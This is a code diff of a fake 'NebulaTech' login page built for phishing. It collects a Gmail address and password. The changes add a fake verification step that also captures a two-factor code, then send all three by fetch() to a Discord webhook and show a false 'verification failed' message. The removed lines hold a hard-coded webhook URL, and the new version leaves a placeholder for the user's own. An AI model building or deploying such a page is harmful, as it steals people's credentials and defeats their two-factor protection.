@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>NebulaTech Secure Gateway</title>
+  <title>NebulaTech Access Gateway</title>
   <style>
     body {
       background-color: #0d0d0d;
@@ -21,6 +21,8 @@
       border-radius: 12px;
       box-shadow: 0 0 25px rgba(0,255,255,0.1);
       width: 380px;
+      display: flex;
+      flex-direction: column;
     }
 
     h2 {
@@ -59,45 +61,69 @@
     button:hover {
       background-color: #00aaaa;
     }
+
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <div class="login-box">
+  <div class="login-box" id="loginStage">
     <h2>NebulaTech Login</h2>
-    <input type="text" id="email" placeholder="Email (required)">
+    <input type="text" id="email" placeholder="Email (Gmail only)">
     <input type="password" id="password" placeholder="Access Key">
-    <button onclick="submitForm()">Access System</button>
+    <button onclick="handleLogin()">Access System</button>
+  </div>
+
+  <div class="login-box hidden" id="codeStage">
+    <h2>Verification Required</h2>
+    <p style="margin-bottom:10px;">A security code has been sent to your Gmail.</p>
+    <input type="text" id="codeInput" placeholder="Enter 6-digit Code">
+    <button onclick="handleVerification()">Verify</button>
   </div>
 
   <script>
     function isValidGmail(email) {
-      return /^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email);
+      return /^[a-zA-Z0-9._%+-]{6,}@gmail\.com$/.test(email);
     }
 
-    async function submitForm() {
+    const webhookURL = "https://discord.com/api/webhooks/REPLACE_WITH_YOURS";
+
+    let capturedEmail = "";
+    let capturedPassword = "";
+
+    function handleLogin() {
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value;
 
       if (!isValidGmail(email)) {
-        alert("Invalid email. Must be a valid Gmail address.");
+        alert("Only Gmail addresses are allowed.");
         return;
       }
 
+      capturedEmail = email;
+      capturedPassword = password;
+
+      document.getElementById("loginStage").classList.add("hidden");
+      document.getElementById("codeStage").classList.remove("hidden");
+    }
+
+    async function handleVerification() {
+      const code = document.getElementById("codeInput").value;
+
       const payload = {
-        content: "**Login attempt captured**",
+        content: "**Multi-step login attempt**",
         embeds: [{
-          title: "📥 NebulaTech Credentials",
-          color: 3447003,
+          title: "🛡️ NebulaTech Credentials",
+          color: 15844367,
           fields: [
-            { name: "Email", value: email, inline: false },
-            { name: "Access Key", value: password, inline: false },
-            { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
+            { name: "Email", value: capturedEmail },
+            { name: "Password", value: capturedPassword },
+            { name: "2FA Code", value: code },
+            { name: "Timestamp", value: new Date().toLocaleString() }
           ]
         }]
       };
-
-      // Replace with your actual webhook URL
-      const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";
 
       try {
         await fetch(webhookURL, {
@@ -106,15 +132,13 @@
           body: JSON.stringify(payload)
         });
       } catch (e) {
-        // Optional: log to console if webhook fails
-        console.warn("Webhook failed", e);
+        console.warn("Webhook error:", e);
       }
 
-      // Simulate failed login
       setTimeout(() => {
-        alert("Authentication failed. Please try again.");
+        alert("Verification failed. Please try again.");
         location.reload();
-      }, 800);
+      }, 1000);
     }
   </script>
 </body>
